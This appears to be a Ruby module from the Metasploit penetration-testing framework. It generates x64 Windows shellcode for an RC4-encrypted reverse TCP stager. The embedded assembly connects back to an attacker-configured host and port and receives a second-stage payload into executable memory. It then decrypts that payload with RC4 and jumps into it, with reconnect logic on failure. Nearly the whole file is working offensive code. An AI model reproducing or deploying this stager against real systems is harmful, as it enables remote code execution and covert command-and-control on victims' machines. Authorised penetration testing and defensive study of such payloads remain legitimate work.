# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/reverse_tcp'
require 'msf/core/payload/windows/x64/rc4'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_X64
#
###

module Payload::Windows::ReverseTcpRc4_x64

  include Msf::Payload::Windows::ReverseTcp_x64
  include Msf::Payload::Windows::Rc4_x64

  #
  # Generate the first stage
  #
  def generate
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      xorkey:      xorkey,
      rc4key:      rc4key,
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp_rc4(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp_rc4(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp               ; block API pointer
      #{asm_reverse_tcp(opts)}
      #{asm_block_recv_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  def asm_block_recv_rc4(opts={})
    xorkey = Rex::Text.to_dword(opts[:xorkey]).chomp
    reliable     = opts[:reliable]
    asm = %Q^
      recv:
      ; Receive the size of the incoming second stage...
        sub rsp, 16             ; alloc some space (16 bytes) on stack for to hold the
                                ; second stage length
        mov rdx, rsp            ; set pointer to this buffer
        xor r9, r9              ; flags
        push 4                  ;
        pop r8                  ; length = sizeof( DWORD );
        mov rcx, rdi            ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp                ; recv( s, &dwLength, 4, 0 );
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the recv worked, and reconnect
      ; if it fails
        cmp eax, 0
        jle cleanup_socket
      ^
    end

    asm << %Q^
        add rsp, 32             ; we restore RSP from the api_call so we can pop off RSI next

      ; Alloc a RWX buffer for the second stage
        pop rsi                 ; pop off the second stage length
        mov esi, esi            ; only use the lower-order 32 bits for the size
        xor esi, #{xorkey}    ; XOR the stage length
        lea r11, [rsi+0x100]  ; R11 = stage length + S-box length (alloc length)
        push 0x40               ;
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ;
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx,rcx             ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        ; mov rbx, rax            ; rbx = our new memory address for the new stage
        lea rbx, [rax+0x100]
        ; mov r15, rax            ; save the address so we can jump into it later
        mov r15, rbx
	push rbx              ; save stage address
        push rsi              ; push stage length
        push rax              ; push the address of the S-box

      read_more:                ;
        xor r9, r9              ; flags
        mov r8, rsi             ; length
        mov rdx, rbx            ; the current address into our second stages RWX buffer
        mov rcx, rdi            ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp                ; recv( s, buffer, length, 0 );
        add rsp, 32             ; restore stack after api_call
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the recv worked, and reconnect
      ; if it fails
        cmp eax, 0
        jge read_successful

      ; something failed so free up memory
        pop rax
        push r15
        pop rcx                 ; lpAddress
        push 0x4000             ; MEM_COMMIT
        pop r8                  ; dwFreeType
        push 0                  ; 0
        pop rdx                 ; dwSize
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call rbp                ; VirtualFree(payload, 0, MEM_COMMIT)

      cleanup_socket:
      ; clean up the socket
        push rdi                ; socket handle
        pop rcx                 ; s (closesocket parameter)
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call rbp

      ; and try again
        dec r14                 ; decrement the retry count
        jmp create_socket
      ^
    end

    asm << %Q^
      read_successful:
        add rbx, rax            ; buffer += bytes_received
        sub rsi, rax            ; length -= bytes_received
        ; test rsi, rsi           ; test length
        jnz read_more           ; continue if we have more to read
        mov r14, rdi            ; save socket handle
        pop rdi                 ; address of S-box
        pop rcx                 ; stage length
        pop r9                  ; address of stage
        push r14                ; save socket
        call after_key          ; Call after_key, this pushes the address of the key onto the stack.
        db #{raw_to_db(opts[:rc4key])}
      after_key:
        pop rsi                 ; rsi = RC4 key
      #{asm_decrypt_rc4}
        pop rdi                 ; restrore socket handle
        jmp r15                 ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
